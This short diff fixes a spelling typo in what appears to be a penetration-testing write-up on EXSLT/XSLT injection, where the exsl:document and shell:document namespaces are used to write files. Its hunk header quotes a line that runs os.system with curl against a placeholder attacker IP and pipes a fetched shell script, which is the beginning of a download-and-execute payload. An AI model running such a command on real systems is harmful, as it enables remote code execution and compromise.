@@ -231,7 +231,7 @@ os.system("curl http://<your attacker ip>:8000/<directory your .sh file is in> |
 </xsl:stylesheet>
 ```
 
-This version of EXSLT supports 2 seperate namespaces of exporting text to an uploaded document `exsl:document` or `shell:document`. 
+This version of EXSLT supports 2 separate namespaces of exporting text to an uploaded document `exsl:document` or `shell:document`. 
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
